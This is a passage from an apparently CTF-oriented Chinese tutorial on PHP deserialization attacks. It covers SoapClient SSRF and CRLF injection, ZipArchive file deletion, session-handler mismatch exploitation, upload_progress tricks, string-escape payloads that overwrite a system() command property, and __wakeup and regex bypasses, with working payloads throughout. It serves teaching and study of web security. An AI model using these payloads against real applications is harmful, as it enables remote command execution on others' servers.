<li><p>举例：</p>
<ul>
<li>发起HTTP&#x2F;HTTPS请求</li>
</ul>
  <div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;uri&#x27;</span>=&gt;<span class="string">&#x27;http://example.com:5555&#x27;</span>, <span class="string">&#x27;location&#x27;</span>=&gt;<span class="string">&#x27;http://example.com:5555/aaa&#x27;</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$obj</span>);</span><br><span class="line"><span class="variable">$soap</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$obj</span>));</span><br><span class="line"><span class="variable">$soap</span>-&gt;<span class="title function_ invoke__">aaa</span>(); <span class="comment">// 触发__call方法</span></span><br></pre></td></tr></table></figure></div>
<ul>
<li>CRLF注入进行请求走私（这里CRLF原理是一样的，可以夹带HTTP请求头或者是实现POST数据）</li>
</ul>
  <div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>, <span class="keyword">array</span>( </span><br><span class="line">    <span class="string">&#x27;location&#x27;</span> =&gt; <span class="string">&#x27;http://TargetHost:8080&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;uri&#x27;</span> =&gt;<span class="string">&#x27;uri&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;user_agent&#x27;</span>=&gt;<span class="string">&quot;111111\r\nCookie: Admin=Yes&quot;</span>)); </span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$c</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="variable">$c</span>-&gt;<span class="title function_ invoke__">aaa</span>();</span><br></pre></td></tr></table></figure></div></li>
</ul>
<h4 id="文件删除"><a href="#文件删除" class="headerlink" title="文件删除"></a>文件删除</h4><ul>
<li><p><code>ZipArchive::open</code></p>
</li>
<li><p>利用版本：PHP 5 &gt;&#x3D; 5.2.0、PHP 7、PECL zip &gt;&#x3D; 1.1.0</p>
</li>
<li><p>举例：</p>
  <div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">ZipArchive</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;<span class="title function_ invoke__">open</span>(<span class="string">&quot;file&quot;</span>, <span class="title class_">ZipArchive</span>::<span class="variable constant_">OVERWRITE</span>);</span><br></pre></td></tr></table></figure></div></li>
</ul>
<h3 id="SESSION反序列化"><a href="#SESSION反序列化" class="headerlink" title="SESSION反序列化"></a>SESSION反序列化</h3><h4 id="概念-2"><a href="#概念-2" class="headerlink" title="概念"></a>概念</h4><ul>
<li><p>什么是SESSION？</p>
<ul>
<li>Session 对象存储特定用户会话所需的属性及配置信息。这样，当用户在应用程序的 Web 页之间跳转时，存储在 Session  对象中的变量将不会丢失，而是在整个用户会话中一直存在下去。当用户请求来自应用程序的 Web 页时，如果该用户还没有会话，则 Web  服务器将自动创建一个 Session 对象。当会话过期或被放弃后，服务器将终止该会话。</li>
</ul>
</li>
<li><p>SESSION和COOKIE的区别？</p>
<ul>
<li>Session是储存在服务端的，而Cookie则是储存在客户端的。（其实还有很多不同，这也是开发岗面试喜欢问的一个题目，不过这里我们知道这一点就足够继续学习后面的知识了）</li>
</ul>
</li>
<li><p>SESSION是如何起作用的？</p>
<ul>
<li>当第一次访问网站时，Seesion_start()函数就会创建一个唯一的Session ID，并自动通过HTTP的响应头，将这个Session  ID保存到客户端Cookie中。同时，也在服务器端创建一个以Session  ID命名的文件，用于保存这个用户的会话信息。当同一个用户再次访问这个网站时，也会自动通过HTTP的请求头将Cookie中保存的Seesion  ID再携带过来，这时Session_start()函数就不会再去分配一个新的Session ID，而是在服务器的硬盘中去寻找和这个Session ID同名的Session文件，将这之前为这个用户保存的会话信息读出，在当前脚本中应用，达到跟踪这个用户的目的。</li>
</ul>
</li>
<li><p>php.ini中关于Session的一些配置：</p>
  <div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">session.save_path=&quot;&quot;		设置session的存储路径</span><br><span class="line">session.save_handler=&quot;&quot;		设定用户自定义存储函数</span><br><span class="line">session.auto_start 			指定会话模块是否在请求开始时启动一个会话，默认为0不启动</span><br><span class="line">session.serialize_handler 	定义用来序列化/反序列化的处理器名字，默认使用php</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>PHP中Linux下常见的Session储存位置：</p>
  <div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">/var/lib/php5/sess_PHPSESSID</span><br><span class="line">/var/lib/php7/sess_PHPSESSID</span><br><span class="line">/var/lib/php/sess_PHPSESSID</span><br><span class="line">/tmp/sess_PHPSESSID</span><br><span class="line">/tmp/sessions/sess_PHPSESSED</span><br></pre></td></tr></table></figure></div></li>
</ul>
<h4 id="漏洞成因-1"><a href="#漏洞成因-1" class="headerlink" title="漏洞成因"></a>漏洞成因</h4><p>注意上文中<code>php.ini</code>中有一项<code>session.serialize_handler</code>的配置，这个配置<strong>定义用来序列化&#x2F;反序列化的处理器名字</strong>，常见的有<code>php</code>、<code>php_binary</code>、<code>php_serialize</code>三种引擎。</p>
<ul>
<li>php：键名 + <code>|</code> + 经过<code>serialize</code>序列化处理的数据</li>
<li>php_binary：键名长度对应的ASCII字符 + 键名 + 经过<code>serialize</code>序列化处理的数据</li>
<li>php_serialize：经过<code>serialize</code>序列化处理的数据</li>
</ul>
<p>在PHP代码中，我们可以通过以下代码来设置session储存的引擎：</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php&#x27;</span>);</span><br></pre></td></tr></table></figure></div>

<p>我们本地起一个PHP环境可以看到这三种不同的引擎对应的Session的储存格式：</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php&#x27;</span>);</span><br><span class="line"><span class="comment">// ini_set(&quot;session.serialize_handler&quot;, &quot;php_serialize&quot;);</span></span><br><span class="line"><span class="comment">// ini_set(&quot;session.serialize_handler&quot;, &quot;php_binary&quot;);</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>] = <span class="string">&quot;a&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>我们可以查看session文件（Docker环境下session文件会储存在<code>/tmp/sess_PHPSESSID</code>下）：</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ini_set(&#x27;session.serialize_handler&#x27;, &#x27;php&#x27;);</span></span><br><span class="line">name|s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;</span><br><span class="line"><span class="comment">// ini_set(&quot;session.serialize_handler&quot;, &quot;php_serialize&quot;);</span></span><br><span class="line">a:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;&#125;</span><br><span class="line"><span class="comment">// ini_set(&quot;session.serialize_handler&quot;, &quot;php_binary&quot;);</span></span><br><span class="line">names:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;</span><br></pre></td></tr></table></figure></div>

<p>而SESSION反序列化漏洞的成因就在于<strong>处理SESSION时使用的引擎不同</strong>，导致了SESSION反序列化漏洞的出现。</p>
<h4 id="Challenge-6"><a href="#Challenge-6" class="headerlink" title="Challenge 6"></a>Challenge 6</h4><p>例如我们有以下代码：</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;session.serialize_handler&quot;</span>, <span class="string">&quot;php_serialize&quot;</span>);</span><br><span class="line">	<span class="title function_ invoke__">session_start</span>();</span><br><span class="line">	<span class="comment">// SESSION内容可控</span></span><br><span class="line">	<span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;test&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// evil.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">//注意这里使用的引擎不是php_serialize</span></span><br><span class="line">    <span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;session.serialize_handler&quot;</span>, <span class="string">&quot;php&quot;</span>);</span><br><span class="line">	<span class="title function_ invoke__">session_start</span>();</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Exp</span></span>&#123;</span><br><span class="line">    	<span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line">    	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="title function_ invoke__">system</span>(<span class="variable">$this</span>-&gt;cmd);</span><br><span class="line">        &#125;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>然后我们先来生成一个<code>Exp</code>类的序列化数据：</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Exp</span></span>&#123;</span><br><span class="line">    	<span class="keyword">public</span> <span class="variable">$cmd</span> = <span class="string">&quot;whoami&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">Exp</span>);</span><br><span class="line"><span class="comment">// O:3:&quot;Exp&quot;:1:&#123;s:3:&quot;cmd&quot;;s:6:&quot;whoami&quot;;&#125;</span></span><br></pre></td></tr></table></figure></div>

<p>在将我们的session写入到文件中之前，我们需要在Payload前面加上一个<code>|</code>，将其变成：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">|O:3:&quot;Exp&quot;:1:&#123;s:3:&quot;cmd&quot;;s:6:&quot;whoami&quot;;&#125;</span><br></pre></td></tr></table></figure></div>

<p>因为用的是<code>php</code>引擎，因此遇到<code>|</code>时会将之看做<strong>键名与值的分割符</strong>，从而造成了歧义，导致其在解析session文件时直接对<code>|</code>后的值进行反序列化处理，这也就是为什么代码中没有出现反序列化位点，但是仍然调用到了<code>Exp</code>类的析构函数的原因，就是因为<strong>在解析session文件时对应的引擎进行了反序列化操作</strong>。</p>
<p>我们请求<code>http://localhost/?test=|O:3:%22Exp%22:1:&#123;s:3:%22cmd%22;s:6:%22whoami%22;&#125;</code></p>
<p>然后现在我们的session文件内容如下：</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line">a:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;s:<span class="number">38</span>:<span class="string">&quot;|O:3:&quot;</span>Exp<span class="string">&quot;:1:&#123;s:3:&quot;</span>cmd<span class="string">&quot;;s:6:&quot;</span>whoami<span class="string">&quot;;&#125;&quot;</span>;&#125;</span><br></pre></td></tr></table></figure></div>

<p>实际上就是<code>php</code>引擎把<code>a:1:&#123;s:4:&quot;name&quot;;s:38:&quot;</code>这一部分看作了键名，而<code>O:3:&quot;Exp&quot;:1:&#123;s:3:&quot;cmd&quot;;s:6:&quot;whoami&quot;;&#125;&quot;;&#125;</code>这一部分看作了值，从而对我们的Payload进行了反序列化解析。</p>
<p>此时再去访问<code>evil.php</code>就可以看到成功执行了<code>whoami</code></p>
<h4 id="Upload-Process"><a href="#Upload-Process" class="headerlink" title="Upload_Process"></a>Upload_Process</h4><p>但是多数情况下SESSION的参数并不可控，这个时候需要引入PHP中的<code>upload_process</code>这一机制。</p>
<blockquote>
<p>当  <a class="link"   href="https://www.php.net/manual/zh/session.configuration.php#ini.session.upload-progress.enabled" >session.upload_progress.enabled<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>  INI 选项开启时，PHP 能够在每一个文件上传时监测上传进度。  这个信息对上传请求自身并没有什么帮助，但在文件上传时应用可以发送一个POST请求到终端（例如通过XHR）来检查这个状态 </p>
<p>当一个上传在处理中，同时POST一个与INI中设置的<a class="link"   href="https://www.php.net/manual/zh/session.configuration.php#ini.session.upload-progress.name" >session.upload_progress.name<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>同名变量时，上传进度可以在<a class="link"   href="https://www.php.net/manual/zh/reserved.variables.session.php" >$_SESSION<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>中获得。  当PHP检测到这种POST请求时，它会在<a class="link"   href="https://www.php.net/manual/zh/reserved.variables.session.php" >$_SESSION<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>中添加一组数据, 索引是  <a class="link"   href="https://www.php.net/manual/zh/session.configuration.php#ini.session.upload-progress.prefix" >session.upload_progress.prefix<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>  与  <a class="link"   href="https://www.php.net/manual/zh/session.configuration.php#ini.session.upload-progress.name" >session.upload_progress.name<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>连接在一起的值。</p>
<p>来自：<a class="link"   href="https://www.php.net/manual/zh/session.upload-progress.php" >https://www.php.net/manual/zh/session.upload-progress.php<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
</blockquote>
<p>简而言之，就是我们可以通过带着SessionId去上传一个和<code>session.upload_progress.name</code>同名的文件，就可以将上传文件中的<code>filename</code>写入到session文件中，例如构造如下表单：</p>
<div class="code-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;URL&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span> <span class="attr">value</span>=<span class="string">&quot;test&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;submit&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>然后抓包：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20230312152715125.png"
                      alt="image-20230312152715125"
                ></p>
<p>注意将<code>filename</code>修改为序列化数据，然后带着<code>PHPSESSID</code>请求，还需要<strong>将序列化数据中的双引号加上反斜杠进行转义</strong>，这样也是可以将我们的序列化数据写入到session文件中的。</p>
<p>然而这种方法还需要关注<code>session.upload_progress.cleanup</code>配置的选项，这个配置默认是开启的，开启这个选项后<strong>一旦PHP读取完毕所有POST数据，就会清除进度信息，也就是清除掉SESSION文件</strong>。如果该配置开启，则需要通过<strong>条件竞争</strong>来实现session反序列化。</p>
<h3 id="字符逃逸"><a href="#字符逃逸" class="headerlink" title="字符逃逸"></a>字符逃逸</h3><h4 id="成因"><a href="#成因" class="headerlink" title="成因"></a>成因</h4><p>本质就是因为进行了<strong>长度不对等</strong>的字符串替换，导致替换后的序列化数据长度变长或变短，从而我们可以构造序列化数据，实现序列化数据中某些参数值的篡改或吞并。</p>
<h4 id="替换后变长"><a href="#替换后变长" class="headerlink" title="替换后变长"></a>替换后变长</h4><p>主要思路是通过第一个属性的长度变化来闭合第一个属性的值，然后插入任意序列化字节流实现属性值的覆盖。例如：</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span> = <span class="string">&quot;whoami&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$key</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;key = <span class="variable">$key</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$this</span>-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$patt</span> = <span class="string">&quot;/php/i&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$patt</span>, <span class="string">&quot;hack!&quot;</span>, <span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">waf</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">A</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key&#x27;</span>]))));</span><br></pre></td></tr></table></figure></div>

<p>这段代码中我们可以控制<code>$key</code>属性的值，但是无法控制<code>$cmd</code>属性的值，不过我们可以通过<code>waf</code>函数来实现字符串长度变长，从<code>php</code>替换到<code>hack!</code>字符长度增加2个，于是我们可以构造Payload来控制整个序列化字符串。</p>
<p>例如我们想要修改<code>$cmd</code>属性为<code>ls</code>，对应的序列化字符流就是<code>&quot;;s:3:&quot;cmd&quot;;s:2:&quot;ls&quot;;&#125;</code>，前面的引号是用来闭合上一个变量的，这段字符的长度为<code>22</code>，一个<code>php</code>可以逃逸出<code>2</code>个字符的长度，因此构造<code>11</code>个<code>php</code>就可以将我们想要的字符全部逃逸出去。</p>
<p>Payload如下：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">phpphpphpphpphpphpphpphpphpphpphp&quot;;s:3:&quot;cmd&quot;;s:2:&quot;ls&quot;;&#125;</span><br></pre></td></tr></table></figure></div>

<p>最终我们生成出来的序列化字节流如下：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:1:&quot;A&quot;:2:&#123;s:3:&quot;key&quot;;s:55:&quot;hack!hack!hack!hack!hack!hack!hack!hack!hack!hack!hack!&quot;;s:3:&quot;cmd&quot;;s:2:&quot;ls&quot;;&#125;&quot;;s:3:&quot;cmd&quot;;s:6:&quot;whoami&quot;;&#125;</span><br></pre></td></tr></table></figure></div>

<p>实际上<code>&quot;;s:3:&quot;cmd&quot;;s:6:&quot;whoami&quot;;&#125;</code>这一段已经被被PHP舍弃了，等同于我们覆盖了<code>$cmd</code>属性的值。</p>
<p>需要注意的是如果我们想要把<code>$cmd</code>修改为其他值，就需要重新计算逃逸的长度。</p>
<p>在比赛中我们可以通过以下的形式来进行调试：</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">waf</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">A</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key&#x27;</span>]))));</span><br></pre></td></tr></table></figure></div>

<h4 id="替换后变短"><a href="#替换后变短" class="headerlink" title="替换后变短"></a>替换后变短</h4><p>一般是两个参数可控，第一个参数用于字符减少吞掉序列化属性，第二个参数用于注入新的属性值。例如：</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$desp</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span> = <span class="string">&quot;whoami&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span>, <span class="variable">$b</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="variable">$a</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;desp = <span class="variable">$b</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$this</span>-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$patt</span> = <span class="string">&quot;/hacker/i&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$patt</span>, <span class="string">&quot;funny&quot;</span>, <span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">waf</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">A</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>],<span class="variable">$_GET</span>[<span class="string">&#x27;desp&#x27;</span>]))));</span><br></pre></td></tr></table></figure></div>

<p>这里我们想要修改<code>$cmd</code>的属性值，但是经过<code>waf</code>函数替换，会将<code>hacker</code>替换为<code>funny</code>，减少了一个字符。借助上面的思路，我们可以利用<code>$name</code>属性来缩短字符长度，然后吞掉<code>$desp</code>的一部分字符，在<code>$desp</code>再注入<code>$cmd</code>参数的值。</p>
<p>我们先去构造<code>$desp</code>中需要注入的Payload：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;;s:3:&quot;cmd&quot;;s:2:&quot;ls&quot;;&#125;</span><br></pre></td></tr></table></figure></div>

<p>序列化之后得到的是：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">s:4:&quot;desp&quot;;s:22:&quot;&quot;;s:3:&quot;cmd&quot;;s:2:&quot;ls&quot;;&#125;</span><br></pre></td></tr></table></figure></div>

<p>我们想要留下的只有<code>&quot;;s:3:&quot;cmd&quot;;s:2:&quot;ls&quot;;&#125;</code>，因此前面的<code>s:4:&quot;desp&quot;;s:22:&quot;</code>就是我们需要利用<code>$name</code>字符缩减来吞掉的字符，共计<code>19</code>个字符，每次替换会减少<code>1</code>个字符，因此构造<code>19</code>个<code>hacker</code>来吞掉这段字符。</p>
<p>最终Payload：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">name=hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker&amp;desp=&quot;;s:3:&quot;cmd&quot;;s:2:&quot;ls&quot;;&#125;</span><br></pre></td></tr></table></figure></div>

<p>构造出的反序列化数据实际上是这样的：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;s:4:&quot;name&quot;;s:114:&quot;funnyfunnyfunnyfunnyfunnyfunnyfunnyfunnyfunnyfunnyfunnyfunnyfunnyfunnyfunnyfunnyfunnyfunnyfunny&quot;;s:4:&quot;desp&quot;;s:22:&quot;&quot;;s:3:&quot;cmd&quot;;s:2:&quot;ls&quot;;&#125;&quot;;s:3:&quot;cmd&quot;;s:6:&quot;whoami&quot;;&#125;</span><br></pre></td></tr></table></figure></div>



<h3 id="Trick总结"><a href="#Trick总结" class="headerlink" title="Trick总结"></a>Trick总结</h3><h4 id="绕过-wakeup（CVE-2016-7124）"><a href="#绕过-wakeup（CVE-2016-7124）" class="headerlink" title="绕过__wakeup（CVE-2016-7124）"></a>绕过__wakeup（CVE-2016-7124）</h4><ul>
<li><p>版本限制（版本限制比较苛刻）</p>
<ul>
<li>PHP5 &lt; <strong>5.6.25</strong></li>
<li>PHP7 &lt; <strong>7.0.10</strong></li>
</ul>
</li>
<li><p>利用方法</p>
<ul>
<li><strong>表示属性个数的值大于真实属性个数</strong>会绕过<code>__wakeup</code>函数的执行。</li>
</ul>
</li>
<li><p>举例</p>
<p>  正常获取到的序列化数据如下：</p>
  <div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:3:&quot;Exp&quot;:1:&#123;s:3:&quot;cmd&quot;;s:6:&quot;whoami&quot;;&#125;</span><br></pre></td></tr></table></figure></div>

<p>  绕过<code>__wakeup</code>时则需要修改为：</p>
  <div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:3:&quot;Exp&quot;:2:&#123;s:3:&quot;cmd&quot;;s:6:&quot;whoami&quot;;&#125;</span><br></pre></td></tr></table></figure></div></li>
</ul>
<h4 id="序列化数据正则绕过"><a href="#序列化数据正则绕过" class="headerlink" title="序列化数据正则绕过"></a>序列化数据正则绕过</h4><p>例如题目有如下的正则检测：<code>preg_match(&#39;/^O:\d+/&#39;)</code></p>
<p>可以在regex101进行正则测试：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20230313144447754.png"
                      alt="image-20230313144447754"
                ></p>
<p>这里对序列化数据进行了限制，要求不能直接反序列化对象，这里的绕过方法主要有两种。</p>
<ul>
<li><p>数字前加<code>+</code></p>
  <div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line">O:+<span class="number">3</span>:<span class="string">&quot;Exp&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">3</span>:<span class="string">&quot;cmd&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;whoami&quot;</span>;&#125;</span><br><span class="line"><span class="comment">// 这里注意如果是GET方式请求的数据，需要将+ URL编码为 %2B</span></span><br></pre></td></tr></table></figure></div>
</li>
<li><p>序列化时以数组形式序列化：</p>
